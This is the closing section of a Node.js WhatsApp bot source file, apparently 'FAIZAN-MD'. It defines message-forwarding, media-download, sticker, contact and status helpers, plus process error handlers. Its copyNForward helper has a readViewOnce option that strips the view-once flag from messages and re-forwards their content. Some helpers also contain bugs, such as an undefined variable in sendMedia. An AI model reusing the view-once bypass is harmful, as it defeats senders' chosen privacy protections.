                command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
            } else if (
                command.on === "sticker" &&
                mek.type === "stickerMessage"
            ) {
                command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
            }
        });
        
      } // end for (const mek of upsertEvent.messages)
    });
    
    //===================================================   
    conn.decodeJid = jid => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return (
                (decode.user &&
                    decode.server &&
                    decode.user + '@' + decode.server) ||
                jid
            );
        } else return jid;
    };
    
    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
        let vtype
        if (options.readViewOnce) {
            message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
            vtype = Object.keys(message.message.viewOnceMessage.message)[0]
            delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
            delete message.message.viewOnceMessage.message[vtype].viewOnce
            message.message = {
                ...message.message.viewOnceMessage.message
            }
        }
      
        let mtype = Object.keys(message.message)[0]
        let content = await generateForwardMessageContent(message, forceForward)
        let ctype = Object.keys(content)[0]
        let context = {}
        if (mtype != "conversation") context = message.message[mtype].contextInfo
        content[ctype].contextInfo = {
            ...context,
            ...content[ctype].contextInfo
        }
        const waMessage = await generateWAMessageFromContent(jid, content, options ? {
            ...content[ctype],
            ...options,
            ...(options.contextInfo ? {
                contextInfo: {
                    ...content[ctype].contextInfo,
                    ...options.contextInfo
                }
            } : {})
        } : {})
        await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
        return waMessage
    }
    
    conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
        let quoted = message.msg ? message.msg : message
        let mime = (message.msg || message).mimetype || ''
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
        const stream = await downloadContentFromMessage(quoted, messageType)
        let buffer = Buffer.from([])
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk])
        }
        let type = await FileType.fromBuffer(buffer)
        trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
        await fs.writeFileSync(trueFileName, buffer)
        return trueFileName
    }
    
    conn.downloadMediaMessage = async(message) => {
        let mime = (message.msg || message).mimetype || ''
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
        const stream = await downloadContentFromMessage(message, messageType)
        let buffer = Buffer.from([])
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk])
        }
        return buffer
    }
    
    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
        let mime = '';
        let res = await axios.head(url)
        mime = res.headers['content-type']
        if (mime.split("/")[1] === "gif") {
            return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, contextInfo: globalContextInfo, ...options }, { quoted: quoted, ...options })
        }
        let type = mime.split("/")[0] + "Message"
        if (mime === "application/pdf") {
            return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, contextInfo: globalContextInfo, ...options }, { quoted: quoted, ...options })
        }
        if (mime.split("/")[0] === "image") {
            return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, contextInfo: globalContextInfo, ...options }, { quoted: quoted, ...options })
        }
        if (mime.split("/")[0] === "video") {
            return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', contextInfo: globalContextInfo, ...options }, { quoted: quoted, ...options })
        }
        if (mime.split("/")[0] === "audio") {
            return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', contextInfo: globalContextInfo, ...options }, { quoted: quoted, ...options })
        }
    }
    
    conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
        let mtype = Object.keys(copy.message)[0]
        let isEphemeral = mtype === 'ephemeralMessage'
        if (isEphemeral) {
            mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
        }
        let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
        let content = msg[mtype]
        if (typeof content === 'string') msg[mtype] = text || content
        else if (content.caption) content.caption = text || content.caption
        else if (content.text) content.text = text || content.text
        if (typeof content !== 'string') msg[mtype] = {
            ...content,
            ...options
        }
        if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
        else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
        if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
        else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
        copy.key.remoteJid = jid
        copy.key.fromMe = sender === conn.user.id
      
        return proto.WebMessageInfo.fromObject(copy)
    }
    
    conn.getFile = async(PATH, save) => {
        let res
        let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
        let type = await FileType.fromBuffer(data) || {
            mime: 'application/octet-stream',
            ext: '.bin'
        }
        let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
        if (data && save) fs.promises.writeFile(filename, data)
        return {
            res,
            filename,
            size: await getSizeMedia(data),
            ...type,
            data
        }
    }
    
    conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
        let types = await conn.getFile(PATH, true)
        let { filename, size, ext, mime, data } = types
        let type = '',
            mimetype = mime,
            pathFile = filename
        if (options.asDocument) type = 'document'
        if (options.asSticker || /webp/.test(mime)) {
            let { writeExif } = require('./exif.js')
            let media = { mimetype: mime, data }
            pathFile = await writeExif(media, { packname: config.STICKER_NAME || 'FAIZAN-MD', author: config.OWNER_NAME || 'FAIZAN', categories: options.categories ? options.categories : [] })
            await fs.promises.unlink(filename)
            type = 'sticker'
            mimetype = 'image/webp'
        } else if (/image/.test(mime)) type = 'image'
        else if (/video/.test(mime)) type = 'video'
        else if (/audio/.test(mime)) type = 'audio'
        else type = 'document'
        await conn.sendMessage(jid, {
            [type]: { url: pathFile },
            mimetype,
            fileName,
            contextInfo: globalContextInfo,
            ...options
        }, { quoted, ...options })
        return fs.promises.unlink(pathFile)
    }
    
    conn.parseMention = async(text) => {
        return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
    }
    
    conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
        let types = await conn.getFile(path, true)
        let { mime, ext, res, data, filename } = types
        if (res && res.status !== 200 || file.length <= 65536) {
            try { throw { json: JSON.parse(file.toString()) } } catch (e) { if (e.json) throw e.json }
        }
        let type = '',
            mimetype = mime,
            pathFile = filename
        if (options.asDocument) type = 'document'
        if (options.asSticker || /webp/.test(mime)) {
            let { writeExif } = require('./exif')
            let media = { mimetype: mime, data }
            pathFile = await writeExif(media, { packname: options.packname ? options.packname : config.BOT_NAME, author: options.author ? options.author : config.OWNER_NAME, categories: options.categories ? options.categories : [] })
            await fs.promises.unlink(filename)
            type = 'sticker'
            mimetype = 'image/webp'
        } else if (/image/.test(mime)) type = 'image'
        else if (/video/.test(mime)) type = 'video'
        else if (/audio/.test(mime)) type = 'audio'
        else type = 'document'
        await conn.sendMessage(jid, {
            [type]: { url: pathFile },
            caption,
            mimetype,
            fileName,
            contextInfo: globalContextInfo,
            ...options
        }, { quoted, ...options })
        return fs.promises.unlink(pathFile)
    }
    
    conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
        let buffer;
        if (options && (options.packname || options.author)) {
            buffer = await writeExifVid(buff, options);
        } else {
            buffer = await videoToWebp(buff);
        }
        await conn.sendMessage(
            jid,
            { sticker: { url: buffer }, contextInfo: globalContextInfo, ...options },
            options
        );
    };
    
    conn.sendImageAsSticker = async (jid, buff, options = {}) => {
        let buffer;
        if (options && (options.packname || options.author)) {
            buffer = await writeExifImg(buff, options);
        } else {
            buffer = await imageToWebp(buff);
        }
        await conn.sendMessage(
            jid,
            { sticker: { url: buffer }, contextInfo: globalContextInfo, ...options },
            options
        );
    };
    
    conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })
    
    conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
        let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
        return await conn.sendMessage(jid, { image: buffer, caption: caption, contextInfo: globalContextInfo, ...options }, { quoted })
    }
    
    conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, contextInfo: globalContextInfo, ...options }, { quoted })
    
    conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
        let buttonMessage = {
            text,
            footer,
            buttons,
            headerType: 2,
            contextInfo: globalContextInfo,
            ...options
        }
        conn.sendMessage(jid, buttonMessage, { quoted, ...options })
    }
    
    conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
        let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer })
        var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
            templateMessage: {
                hydratedTemplate: {
                    imageMessage: message.imageMessage,
                    "hydratedContentText": text,
                    "hydratedFooterText": footer,
                    "hydratedButtons": but
                }
            }
        }), options)
        conn.relayMessage(jid, template.message, { messageId: template.key.id })
    }
    
    conn.getName = (jid, withoutContact = false) => {
        id = conn.decodeJid(jid);
        withoutContact = conn.withoutContact || withoutContact;
        let v;
        if (id.endsWith('@g.us'))
            return new Promise(async resolve => {
                v = store.contacts[id] || {};
                if (!(v.name.notify || v.subject))
                    v = conn.groupMetadata(id) || {};
                resolve(
                    v.name ||
                        v.subject ||
                        PhoneNumber(
                            '+' + id.replace('@s.whatsapp.net', ''),
                        ).getNumber('international'),
                );
            });
        else
            v =
                id === '0@s.whatsapp.net'
                    ? {
                            id,
                            name: 'WhatsApp',
                      }
                    : id === conn.decodeJid(conn.user.id)
                    ? conn.user
                    : store.contacts[id] || {};

        return (
            (withoutContact ? '' : v.name) ||
            v.subject ||
            v.verifiedName ||
            PhoneNumber(
                '+' + jid.replace('@s.whatsapp.net', ''),
            ).getNumber('international')
        );
    };

    conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
        let list = [];
        for (let i of kon) {
            list.push({
                displayName: await conn.getName(i + '@s.whatsapp.net'),
                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(i + '@s.whatsapp.net')}\nFN:${config.OWNER_NAME}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${config.OWNER_EMAIL || ''}\nitem2.X-ABLabel:Email\nitem3.URL:${config.REPO || ''}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${config.LOCATION || ''};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
            });
        }
        conn.sendMessage(
            jid,
            {
                contacts: {
                    displayName: `${list.length} Contact`,
                    contacts: list,
                },
                contextInfo: globalContextInfo,
                ...opts,
            },
            { quoted },
        );
    };

    conn.setStatus = status => {
        conn.query({
            tag: 'iq',
            attrs: {
                to: '@s.whatsapp.net',
                type: 'set',
                xmlns: 'status',
            },
            content: [
                {
                    tag: 'status',
                    attrs: {},
                    content: Buffer.from(status, 'utf-8'),
                },
            ],
        });
        return status;
    };
    
    conn.serializeM = mek => sms(conn, mek);
    
    return conn;
}

// ── worker entrypoint: connect this number ─────────────────────────────
module.exports = { connectToWA };

if (require.main === module) {
    setTimeout(() => {
        connectToWA().catch(e => {
            console.error('[❌] Fatal start error:', e);
            process.exit(1);
        });
    }, 2000);
}

process.on('SIGINT', () => {
    console.log('Cleaning up before exit...');
    if (memoryCleanInterval) clearInterval(memoryCleanInterval);
    process.exit(0);
});

process.on('uncaughtException', (err) => {
    // A bare message ("conn is not defined") gave no way to tell which file threw.
    console.error('Uncaught Exception:', err.message);
    if (err.stack) console.error(err.stack);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

module.exports = {
    conn
};
